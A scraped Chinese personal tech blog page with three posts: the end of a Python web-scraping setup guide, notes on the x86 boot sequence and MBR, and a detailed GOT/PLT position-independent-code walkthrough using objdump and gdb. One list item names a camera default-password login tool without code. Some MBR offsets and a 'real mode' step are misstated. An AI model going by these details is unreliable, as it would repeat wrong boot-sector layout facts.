<li>百度音乐（requests）</li>
<li>学生购电网络查询系统: 用电数据爬取(requests+lxml)</li>
<li>超星数字图书馆(北邮镜像): 在线阅读书籍爬取转换(selenium)</li>
<li>北京邮电大学迎新网：新生宿舍情况爬取(selenium)</li>
<li>北邮人论坛：在线用户数据爬取(scrapy)</li>
<li>Hikvision视频监控系统：摄像头发现与默认密码登录(gevent)</li>
</ul>
<p>看了看不想写了……好麻烦……</p>
<p>如果有空，一点一点更吧。</p>
<h2 id="环境配置——工欲善其事，必先利其器">环境配置——工欲善其事，必先利其器</h2><p>我在linux下使用python，强烈建议任何没什么特殊要求的人在linux环境下使用python。最不济，也得是unix吧。</p>
<p>如果，你坚持在windows使用python。给您个参考：<a href="http://v2ex.com/t/127612" target="_blank" rel="external">http://v2ex.com/t/127612</a></p>
<p>所谓quick and dirty，是因为我实在没有本事把代码写得优美、高效，它能起作用，管它什么样子我也懒得去管它了。我个人没有不断优化啊封装啊的癖好和耐心。仅仅做到我想做的事就够了。</p>
<p>所以，如果下面的代码看上去不堪入目、那就对了……</p>
<p>首先讲环境的配置，强烈建议你使用ipython, ipython提供了一个增强太多的交互shell，让你能像使用matlab一样一边试验一边写代码，以一种迭代开发模式来完成心愿，我觉得这是解释型语言的一大优点。</p>
<p>另外python3能让生活变得简单，但也许你像我一样懒，那2就2吧。</p>
<p>linux下安装ipython很简单，用包管理器比如apt-get安装就是了，别傻兮兮的自己编译。</p>
<pre><code><span class="title">sudo</span> emerge ipython
</code></pre><p>还需要python的包管理器。一般叫pip或者python-pip或者类似名字的</p>
<pre><code><span class="title">sudo</span> emerge pip
</code></pre><p>接着需要安装一些常用的非标准库中的模块, 这时你可以使用linux的包管理器来装(查清楚名字，不同发行版打包不一样)，如果有的话最好。</p>
<pre><code><span class="title">sudo</span> emerge requests gevent lxml scrapy selenium
</code></pre><p>或者用pip来装。(有些模块会依赖其它东西比如lxml会依赖libxml2，要是我没记错的话，如果出错认真看错误信息，不会有什么奇葩问题)。</p>
<pre><code>pip install --<span class="keyword">user</span> <span class="title">requests</span> lxml gevent Scrapy selenium
</code></pre><p>如果想让人生简单一点，就别傻兮兮的下载各个python模块的包自己手动装。</p>
<p>然后，完事了，就是这么简单。别听上面的讨论瞎扯要什么四个小时，这时候就可以天马行空的hacking了，什么nose什么virtualenv等等真不是必要的。</p>
<p>linux下简单的配置，你就可以干很多事情了。不相信，那以后再说吧。</p>
<p>最后的结果，应该像这里<a href="https://www.python.org/shell/" target="_blank" rel="external">https://www.python.org/shell/</a></p>
<p>如果你那个交互式控制台加载不进来，那么你大概需要翻墙，不然google打不开、stackoverflow加载不了还怎么愉快地玩耍。chon同学似乎在做vpn <a href="https://moevpn.com/，" target="_blank" rel="external">https://moevpn.com/，</a> you may consider it。想想像chon大大这么用python构建严肃应用的才叫牛逼啊……</p>
<p>洗衣服去了，有兴致了再说，忘记了就算了。</p>
<p>基本爬虫这种东西，写着写着就从find到re从re到xpath/css selector最后没有啥性能要求的就愉快的开始selenium……</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/os/2015/03/30/boot-sequence/" itemprop="url">
                  boot sequence
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-03-30T00:00:00+08:00" content="2015-03-30">
              2015-03-30
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/os/" itemprop="url" rel="index">
                    <span itemprop="name">os</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/os/2015/03/30/boot-sequence/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="os/2015/03/30/boot-sequence/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="POST">POST</h2><p>Power-on  Self-Test, 定位设备</p>
<h2 id="主引导记录">主引导记录</h2><p>如果设备的启动扇区的511和512字节是<code>0x55</code>和<code>0xAA</code>。BIOS会发现这样的启动扇区，载入内存<code>0x0000:0x7c00</code>(有些是<code>0x7c0:0x0000</code>， 同一个物理地址)。让<code>CS:IP</code>在启动扇区的最开始是个好的实践。</p>
<p>执行被移交给刚加载的启动记录。软盘上所有的512字节都会是可执行代码。硬盘上则在偏移为<code>0x0000-0x01bd</code>的主引导记录处放置可执行代码。然后是四个主分区的表条目，每个条目使用16字节(<code>0x01fd-0x01be</code>),还有两字节的签名(<code>0x01ef-0x01ff</code>)</p>
<h2 id="早期环境">早期环境</h2><p>早期执行环境高度依赖实现。特定的BIOS有特定的实现。不要做关于寄存器中内容的任何假设。也许被初始化为0,也许包含假的值。</p>
<p>CPU现在在实模式。你不仅要写激活保护模式的代码还要添加测试条件看看有没有激活。</p>
<h2 id="内核">内核</h2><p>启动载入器把内核载入内存并移交控制权。</p>
<h2 id="载入">载入</h2><p>我们已经知道要载入什么，但不知道如何载入。</p>
<p>如果从硬盘载入，引导记录(boot record)只有446字节大小。以下是内核镜像启动前必须要做的：</p>
<ul>
<li>从哪个分区启动</li>
<li>找到启动分区上的内核镜像</li>
<li>将内核镜像载入内存</li>
<li>激活实模式</li>
<li>为内核准备运行时环境</li>
</ul>
<p>不用按顺序来，但调用<code>kmain()</code>之前做完这些。</p>
<p>To make things worse，gcc只生成保护模式的可执行代码，所以这部分是你用C做不到的。</p>
<p>有几种解决问题的方式：</p>
<ul>
<li>geek loading：把上面列出的一切都挤压到引导记录中。这几乎不可能，会让接下来的特例处理和有用的错误信息无处安放。</li>
<li>One-stage loading: 写一个stub来转换，链接到内核镜像之前。引导记录加载内核镜像(在1mb(因为<code>[ES:BX]</code>0xffff x 0xffff = 1114095b约为1mb)内存标志下,实模式的最大内存上限),跳转到stub，stub转换到保护模式并准备运行环境，跳入内核。</li>
<li>Two-stage loading: 写一个分开的stub，这个stub载入到1mb内存标志下，然后做以上列表中的所有事。</li>
</ul>
<h3 id="传统方式">传统方式</h3><p>传统，MBR重定位到<code>0x0000:0x0600</code>，找到有用分区的分区表，载入分区表的第一个扇区(分区引导记录)至<code>0x0000:0x7c00</code>，并跳转到该地址。这叫链式载入，想要自己写的引导记录能双启动的话就模仿这种方式。</p>
<h3 id="简单方法">简单方法</h3><p>除非你真得想因为教学目的自制启动载入器(记录/stub)，推荐使用可用的启动载入器。</p>
<p>其中最突出的是GRUB，一个two-stage启动载入器，不仅提供能链式载入的启动菜单，而且准备好环境(包括保护模式和读取BIOS上有价值的信息)，把普通的可执行文件作为内核载入(而不是像很多启动载入器要求flat binary(不包含任何头的二进制文件))，支持可选的内核模块，不同的文件系统，甚至无盘启动(如果配置得当)</p>
<ul>
<li><a href="http://duartes.org/gustavo/blog/post/how-computers-boot-up" target="_blank" rel="external">How computers boot up</a></li>
<li><a href="http://duartes.org/gustavo/blog/post/kernel-boot-process" target="_blank" rel="external">The Kernel Boot Process</a></li>
<li><a href="http://www.ibm.com/developerworks/library/l-linuxboot/index.html" target="_blank" rel="external">Inside the Linux boot process</a></li>
</ul>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/linux/2015/03/19/position-independent-code-pic-in-shared-libraries/" itemprop="url">
                  Position Independent Code (PIC) in shared libraries
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-03-19T00:00:00+08:00" content="2015-03-19">
              2015-03-19
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/linux/" itemprop="url" rel="index">
                    <span itemprop="name">linux</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/linux/2015/03/19/position-independent-code-pic-in-shared-libraries/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux/2015/03/19/position-independent-code-pic-in-shared-libraries/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>动态载入有好几个问题：</p>
<ul>
<li>需要时间载入，每次引用都要重定位</li>
<li>让<code>.text</code>区域不能共享，浪费了RAM空间</li>
<li><code>.text</code>必须能写入带来安全问题</li>
</ul>
<p>PIC能解决这些问题：</p>
<p>PIC背后的思想很简单，为代码中的全局数据和函数引用外加一层重定向。通过利用链接和加载过程，可能让共享库中的<code>text</code>部分完全位置无关。它可以被映射到不同的内存地址无需修改。</p>
<h2 id="洞见1：text和data段之间的偏移">洞见1：text和data段之间的偏移</h2><p>PIC依赖于数据段和代码段之间的偏移，这些数据在链接时就被链接器知道了。当链接结合几个目标文件时，链接器手机不同目标文件的各个段然后合成一个。因此，链接器知道段的尺寸相对位置。</p>
<p>比如说数据段紧接着代码段，在代码段中引用数据段中某个数据的相对地址就能通过简单的计算得到。当前代码在代码段中的偏移已知，代码段基址与数据段之间的偏移已知，调用的相对地址就是两者之差。</p>
<pre><code>(地址由低到高，位置都是已知的)
text基址
<span class="attribute">...</span>
某需要相对引用指令-------<span class="subst">\</span>
<span class="attribute">...</span>                       |
<span class="built_in">data</span>基址                  |相对地址
<span class="attribute">...</span>                       |
被引用的数据      -------/
<span class="attribute">...</span>
</code></pre><h2 id="洞见2：基于程序指针的取址">洞见2：基于程序指针的取址</h2><p>x86没有对eip操作的指令，不能通过程序指针取地址，但x64可以啊</p>
<p>x86很多指令需要绝对地址，通过相对与程序指针取址可以得到。</p>
<p>很多shellcode用这个获取程序指针：</p>
<pre><code><span class="keyword">call</span> something
something：
    <span class="keyword">pop</span> <span class="literal">ebx</span>
</code></pre><p><code>ebx</code>中现在就是程序指针的值了</p>
<h2 id="数据索引">数据索引</h2><h3 id="全局偏移表(GOT)">全局偏移表(GOT)</h3><p>面试被问及这个怎么组织的？我不是很明白什么意思。早年曾经就跟着这篇文章打开gdb很好奇的看got/plt是怎么回事。</p>
<p>通过以上两个洞见，在x86上实现PIC也是可能的。通过GOT完成。</p>
<p>GOT就是一个地址表，在数据段中。当一个代码段中的指令想引用某个变量，不是直接通过绝对地址(需要重定位),而是引用GOT中的条目。显然GOT的地址确定，GOT的条目则将保存变量的绝对地址。</p>
<p><img src="http://eli.thegreenplace.net/images/2011/code_data_got_1.png" alt="got"></p>
<p>GOT中的条目还是得重定位= =，但相对于载入时重定位，有两个好处</p>
<ul>
<li>重定位每个变量只重定位一次</li>
<li>数据段是可写的，不被进程共享。添加重定位没什么影响。将重定位从代码段移过来，让代码段只读并且在进程间可以共享。</li>
</ul>
<h3 id="一个例子">一个例子</h3><p><code>ml_main_pic.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> myglob = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_util_func</span><span class="params">(<span class="keyword">int</span> a)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = b + ml_util_func(a);</span><br><span class="line">    myglob += c;</span><br><span class="line">    <span class="keyword">return</span> b + myglob;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译为PIC的动态库</p>
<pre><code>~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/blackhat/</span>eli  gcc -fPIC -m32 -g -shared ml_main_pic.c -o libmlpic.so
</code></pre><p>反汇编</p>
<pre><code> ~/Work/project/blackhat/eli  objdump -d -Mintel libmlpic_dataonly.so   
<span class="label">
libmlpic_dataonly.so:</span>     file format elf32-i386
...
0000053c &lt;ml_func&gt;:
 53c:   <span class="number">55</span>                      <span class="keyword">push</span>   <span class="literal">ebp</span>
 <span class="number">53d</span>:   <span class="number">89</span> e5                   <span class="keyword">mov</span>    <span class="literal">ebp</span>,<span class="literal">esp</span>
 53f:   e8 1a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   55e &lt;__x86.get_pc_thunk.cx&gt;
 <span class="number">544</span>:   <span class="number">81</span> c1 bc 1a <span class="number">00</span> <span class="number">00</span>       <span class="keyword">add</span>    <span class="literal">ecx</span>,<span class="number">0x1abc</span>
 54a:   8b <span class="number">81</span> ec ff ff ff       <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ecx</span>-<span class="number">0x14</span>]
 <span class="number">550</span>:   8b <span class="number">10</span>                   <span class="keyword">mov</span>    <span class="literal">edx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">eax</span>]
 <span class="number">552</span>:   8b <span class="number">45</span> <span class="number">08</span>                <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0x8</span>]
 <span class="number">555</span>:   <span class="number">01</span> c2                   <span class="keyword">add</span>    <span class="literal">edx</span>,<span class="literal">eax</span>
 <span class="number">557</span>:   8b <span class="number">45</span> 0c                <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0xc</span>]
 55a:   <span class="number">01</span> d0                   <span class="keyword">add</span>    <span class="literal">eax</span>,<span class="literal">edx</span>
 55c:   <span class="number">5d</span>                      <span class="keyword">pop</span>    <span class="literal">ebp</span>
 <span class="number">55d</span>:   c3                      <span class="keyword">ret</span>    

0000055e &lt;__x86.get_pc_thunk.cx&gt;:
 55e:   8b 0c <span class="number">24</span>                <span class="keyword">mov</span>    <span class="literal">ecx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">esp</span>]
 <span class="number">561</span>:   c3                      <span class="keyword">ret</span>    
 <span class="number">562</span>:   <span class="number">66</span> <span class="number">90</span>                   <span class="keyword">xchg</span>   <span class="literal">ax</span>,<span class="literal">ax</span>
</code></pre><p>53f是获取程序指针的方法，把程序指针放到<code>ecx</code>中。</p>
<p>在544后，<code>ecx</code>就持有GOT的地址。</p>
<p>54a后，将<code>myglob</code>在GOT中的的绝对地址放入<code>eax</code></p>
<p>550后，<code>myglob</code>的值被置入<code>edx</code></p>
<p>然后就是简单的加上<code>a</code>和<code>b</code>。</p>
<p>通过readelf可以查看共享库文件中GOT节信息</p>
<pre><code> ~/Work/project/blackhat/eli  readelf -S libmlpic_dataonly.so 
There are <span class="number">33</span> section headers, starting at offset <span class="number">0x1320</span>:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  ...
  [<span class="number">19</span>] .got              PROGBITS        <span class="number">00001f</span>e8 <span class="number">000f</span>e8 <span class="number">000018</span> <span class="number">04</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span>
  [<span class="number">20</span>] .got.plt          PROGBITS        <span class="number">00002000</span> <span class="number">001000</span> <span class="number">000014</span> <span class="number">04</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span>
  ...
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
</code></pre><p>我们算算ELF中写的和编译器做的是否符合。</p>
<pre><code><span class="number">0x544</span>+<span class="number">0x1abc</span>=<span class="number">0x2000</span>
</code></pre><p>正好是<code>.got.plt</code>节的虚拟地址。再计算下myglob地址在GOT中的位置</p>
<pre><code><span class="number">0x2000</span>-<span class="number">0x14</span>=<span class="number">0x1fec</span>
</code></pre><p>我们看看ELF文件中的信息:</p>
<pre><code> ~/Work/project/blackhat/eli  readelf -r libmlpic_dataonly<span class="class">.so</span>

Relocation <span class="tag">section</span> <span class="string">'.rel.dyn'</span> at offset <span class="number">0</span>x358 contains <span class="number">9</span> entries:
 Offset     Info    Type            Sym<span class="class">.Value</span>  Sym. Name
 ...
<span class="number">00001</span>fec  <span class="number">00000606</span> R_386_GLOB_DAT    <span class="number">00002018</span>   myglob
...
</code></pre><p>正好，这里有个重定位。这个重定位就是让链接器把符号地址直接放到这里。</p>
<p>通过gdb看看：</p>
<pre><code> ~/Work/project/blackhat/eli  gcc -m32 -o driver driver.o -L. -lmlpic_dataonly
 ~/Work/project/blackhat/eli  gdb -q driver 
Reading symbols from /home/lyy/Work/project/blackhat/eli/driver..<span class="string">.done</span>.
(gdb)  break ml_func
Breakpoint <span class="number">1</span> <span class="preprocessor">at</span> <span class="number">0x80484c0</span>
(gdb) r
Starting program: /home/lyy/Work/project/blackhat/eli/driver 
<span class="label">warning:</span> the debug information found <span class="keyword">in</span> <span class="string">"/usr/lib64/debug/lib64/ld-2.17.so.debug"</span> does <span class="keyword">not</span> match <span class="string">"/lib/ld-linux.so.2"</span> (CRC mismatch).

addr myglob = <span class="number">0x804a024</span>

Breakpoint <span class="number">1</span>, ml_func (a=<span class="number">1</span>, b=<span class="number">1</span>) <span class="preprocessor">at</span> ml_main_pic.c:<span class="number">5</span>
<span class="number">5</span>           return myglob + a + b<span class="comment">;</span>
(gdb) disas ml_func
Dump of assembler code for function ml_func:
   <span class="number">0xf7fd853c</span> &lt;+<span class="number">0</span>&gt;:     <span class="keyword">push</span>   <span class="literal">ebp</span>
   <span class="number">0xf7fd853d</span> &lt;+<span class="number">1</span>&gt;:     <span class="keyword">mov</span>    <span class="literal">ebp</span>,<span class="literal">esp</span>
   <span class="number">0xf7fd853f</span> &lt;+<span class="number">3</span>&gt;:     <span class="keyword">call</span>   <span class="number">0xf7fd855e</span> &lt;__x86.get_pc_thunk.cx&gt;
   <span class="number">0xf7fd8544</span> &lt;+<span class="number">8</span>&gt;:     <span class="keyword">add</span>    <span class="literal">ecx</span>,<span class="number">0x1abc</span>
=&gt; <span class="number">0xf7fd854a</span> &lt;+<span class="number">14</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ecx</span>-<span class="number">0x14</span>]
   <span class="number">0xf7fd8550</span> &lt;+<span class="number">20</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">edx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">eax</span>]
   <span class="number">0xf7fd8552</span> &lt;+<span class="number">22</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0x8</span>]
   <span class="number">0xf7fd8555</span> &lt;+<span class="number">25</span>&gt;:    <span class="keyword">add</span>    <span class="literal">edx</span>,<span class="literal">eax</span>
   <span class="number">0xf7fd8557</span> &lt;+<span class="number">27</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0xc</span>]
   <span class="number">0xf7fd855a</span> &lt;+<span class="number">30</span>&gt;:    <span class="keyword">add</span>    <span class="literal">eax</span>,<span class="literal">edx</span>
   <span class="number">0xf7fd855c</span> &lt;+<span class="number">32</span>&gt;:    <span class="keyword">pop</span>    <span class="literal">ebp</span>
   <span class="number">0xf7fd855d</span> &lt;+<span class="number">33</span>&gt;:    <span class="keyword">ret</span>    
End of assembler dump.
(gdb) i registers 
<span class="literal">eax</span>            <span class="number">0x1</span>      <span class="number">1</span>
<span class="literal">ecx</span>            <span class="number">0xf7fda000</span>       -<span class="number">134373376</span>
...
(gdb) p/x <span class="number">0xf7fda000</span>-<span class="number">0x14</span> # GOT中glob绝对地址地址
<span class="number">$2</span> = <span class="number">0xf7fd9fec</span>
(gdb) x/x <span class="number">0xf7fd9fec</span>
<span class="number">0xf7fd9fec</span>:     <span class="number">0x0804a024</span>
(gdb) p &amp;myglob 
<span class="number">$4</span> = (<span class="keyword">int</span> *) <span class="number">0x804a024</span> &lt;myglob&gt;
</code></pre><p>就是这样</p>
<h2 id="函数调用">函数调用</h2><p>额，函数调用，阿里电面时问我GOT干什么的，我说解析函数的吧。。。。。。(就是因为当年看得这篇留下的残缺印象)，当时为什么看这篇文章呢？因为发现函数调用竟然都不是直接调用的！！！</p>
<p>函数不是像数据这样简单的引用的。</p>
<h3 id="惰性绑定优化">惰性绑定优化</h3><p>共享库引用一个函数时，函数地址在载入时才能确定。解析这个地址的过程叫做绑定(binding)。这就是动态载入器把共享库载入进程内存空间时所做的。这个绑定过程不简单，载入器不得不通过在特殊的表中查找函数符号来实现。(共享库ELF目标文件确实有以此为目的的特殊的哈希表节)</p>
<p>解析函数花时间，一般函数比全局变量多太多了，更何况很多函数可能根本不会被调用(比如错误处理或特殊情况)。</p>
<p>为了加速函数绑定的过程，智能惰性绑定机制被设计出来。所谓惰性就是在需要的时候再做什么，计算机科学中很多应用比如<a href="http://en.wikipedia.org/wiki/Copy-on-write" target="_blank" rel="external">惰性求值</a>和<a href="http://en.wikipedia.org/wiki/Lazy_evaluation" target="_blank" rel="external">copy-on-write</a></p>
<p>惰性绑定机制通过又一层重定向实现——PLT.</p>
<h3 id="过程链接表(PLT)">过程链接表(PLT)</h3><p>PLT是可执行的<code>.text</code>一部分，包含一系列条目(每个条目对应一个共享库调用的外部函数)</p>
<p>每个PLT条目都是段简短的可执行代码。</p>
<p>代码调用PLT中的条目而不是直接调用函数，PLT中条目负责真正调用函数。</p>
<p>这个设计被成为蹦床(‘trampoline’)<a href="这让我想起了函数式编程的一种优化递归设计。">^1</a>，每个PLT条目对应也在GOT中一个包含函数实际偏移的条目，但仅仅动态载入器解析它后才会对应上。</p>
<p>PLT允许惰性解析，当共享库首次被载入后，函数调用还没被解析：</p>
<p><img src="http://eli.thegreenplace.net/images/2011/plt_before.png" alt="调用时的解析过程"></p>
<p>一点解说：PLT的第一个条目调用解析程序，该程序在动态链接器里(每个都有)。这个程序将把函数的实际地址解析。</p>
<h4 id="第一次">第一次</h4><p>于是乎，当func第一次被调用时，调用<code>PLT[n]</code>的例程，接着根据<code>GOT[n]</code>中的内容跳到准备解析的指令，接着调用解析器，解析器会把func函数的实际地址写入<code>GOT[n]</code>然后调用<code>func</code>。</p>
<h4 id="第二次">第二次</h4><p><img src="http://eli.thegreenplace.net/images/2011/plt_after.png" alt="事情不再相同"></p>
<p>这时候<code>GOT[n]</code>中已经有函数实际地址，从PLT条目直接就跳到函数func的实际代码开始执行。</p>
<p>不再需要解析器，只有一层多余的跳转。这样实际不用的函数永远不用被解析。</p>
<p>同时，这个设计实现了库中代码段完全位置无关。只有GOT中使用了绝对地址，而GOT在数据段中并且会被动态载入器重定位。即使PLT自身都是PIC的，能放到只读的代码段中。</p>
<p>解析器只是一段载入器里的程序，PLT条目中准备的参数，何时的重定向条目帮助它知道需要解析的符号和需要更新的GOT条目。</p>
<h3 id="通过PLT和GOT实现的PIC函数调用——实例">通过PLT和GOT实现的PIC函数调用——实例</h3><p>费曼说：What I can not create, I do not understand. 我们自己亲手做做</p>
<pre><code> ~/Work/project/blackhat/eli  cat ml_main_pic.c
<span class="keyword">int</span> myglob = <span class="number">42</span>;

<span class="function"><span class="keyword">int</span> <span class="title">ml_util_func</span><span class="params">(<span class="keyword">int</span> a)</span>
</span>{
    <span class="keyword">return</span> a + <span class="number">1</span>;
}

<span class="function"><span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span>
</span>{
    <span class="keyword">int</span> c = b + ml_util_func(a);
    myglob += c;
    <span class="keyword">return</span> b + myglob;
}

 ~/Work/project/blackhat/eli  gcc -fPIC -m32 -g -shared ml_main_pic.c -o libmlpic.so

 ~/Work/project/blackhat/eli  objdump -d -Mintel libmlpic.so 

libmlpic.so:     file format elf32-i386
...
<span class="number">00000440</span> &lt;ml_util_func@plt&gt;:
 <span class="number">440</span>:   ff a3 <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       jmp    DWORD PTR [ebx+<span class="number">0x14</span>]
 <span class="number">446</span>:   <span class="number">68</span> <span class="number">10</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          push   <span class="number">0x10</span>
 <span class="number">44</span>b:   e9 c0 ff ff ff          jmp    <span class="number">410</span> &lt;_init+<span class="number">0x30</span>&gt;
...
<span class="number">0000057</span>c &lt;ml_util_func&gt;:
 <span class="number">57</span>c:   <span class="number">55</span>                      push   ebp
 <span class="number">57</span>d:   <span class="number">89</span> e5                   mov    ebp,esp
 <span class="number">57f</span>:   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>]
 <span class="number">582</span>:   <span class="number">83</span> c0 <span class="number">01</span>                add    eax,<span class="number">0x1</span>
 <span class="number">585</span>:   <span class="number">5</span>d                      pop    ebp
 <span class="number">586</span>:   c3                      ret    

<span class="number">00000587</span> &lt;ml_func&gt;:
 <span class="number">587</span>:   <span class="number">55</span>                      push   ebp
 <span class="number">588</span>:   <span class="number">89</span> e5                   mov    ebp,esp
 <span class="number">58</span>a:   <span class="number">53</span>                      push   ebx
 <span class="number">58</span>b:   <span class="number">83</span> ec <span class="number">24</span>                sub    esp,<span class="number">0x24</span>
 <span class="number">58</span>e:   e8 bd fe ff ff          call   <span class="number">450</span> &lt;__x86.get_pc_thunk.bx&gt;
 <span class="number">593</span>:   <span class="number">81</span> c3 <span class="number">6</span>d <span class="number">1</span>a <span class="number">00</span> <span class="number">00</span>       add    ebx,<span class="number">0x1a6d</span>
 <span class="number">599</span>:   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>]
 <span class="number">59</span>c:   <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                mov    DWORD PTR [esp],eax
 <span class="number">59f</span>:   e8 <span class="number">9</span>c fe ff ff          call   <span class="number">440</span> &lt;ml_util_func@plt&gt;
 ...
</code></pre><p>注意59f行的调用，这时<code>ebx</code>是<code>GOT</code>的基址(做减法寻址。。。好奇怪)。</p>
<p>注意440行,PLT条目包含的三部分，一个指向GOT条目中指向的跳转，一个准备解析器参数，一个调用解析器。</p>
<p>我们不在乎410的解析器(PLT[0])</p>
<p>在593的时候获得了<code>eip</code>，接着被加上<code>0x1a6d</code>。GOT的基址就是这个了。</p>
<pre><code><span class="number">0x593</span>+<span class="number">0x1a6d</span>=<span class="number">0x2000</span>
</code></pre><p>可以用<code>readelf</code>看看</p>
<pre><code> ~/Work/project/blackhat/eli  readelf -x <span class="class">.got</span><span class="class">.plt</span> libmlpic<span class="class">.so</span> 

Hex dump of <span class="tag">section</span> <span class="string">'.got.plt'</span>:
  <span class="number">0</span>x00002000 <span class="number">001</span>f0000 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">26040000</span> ............&amp;...
  <span class="number">0</span>x00002010 <span class="number">36040000</span> <span class="number">46040000</span>                   <span class="number">6</span>..<span class="class">.F</span>...
</code></pre><p>条目<code>ml_util_func@plt</code>查看的GOT条目在<code>+0x14</code>位置，即<code>0x2014</code>,上图中可见是<code>0x446</code></p>
<p>正好是<code>ml_util_func@plt</code>中<code>push</code>那一行。</p>
<p>为了让动态链接器能起作用，重定位条目也被添加来指定在GOT中的哪个位置重定位<code>ml_util_func</code></p>
<pre><code> ~/Work/project/blackhat/eli  readelf -r libmlpic.so

Relocation section '.rel.dyn' at offset 0x380 contains 9 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
00001ef4  <span class="number">00000008</span> R_386_RELATIVE   
00001ef8  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00002018</span>  <span class="number">00000008</span> R_386_RELATIVE   
00001fe8  <span class="number">00000106</span> R_386_GLOB_DAT    <span class="number">00000000</span>   _ITM_deregisterTMClone
00001fec  <span class="number">00000606</span> R_386_GLOB_DAT    <span class="number">0000201</span>c   myglob
00001ff0  <span class="number">00000206</span> R_386_GLOB_DAT    <span class="number">00000000</span>   __cxa_finalize
00001ff4  <span class="number">00000306</span> R_386_GLOB_DAT    <span class="number">00000000</span>   __gmon_start__
00001ff8  <span class="number">00000406</span> R_386_GLOB_DAT    <span class="number">00000000</span>   _Jv_RegisterClasses
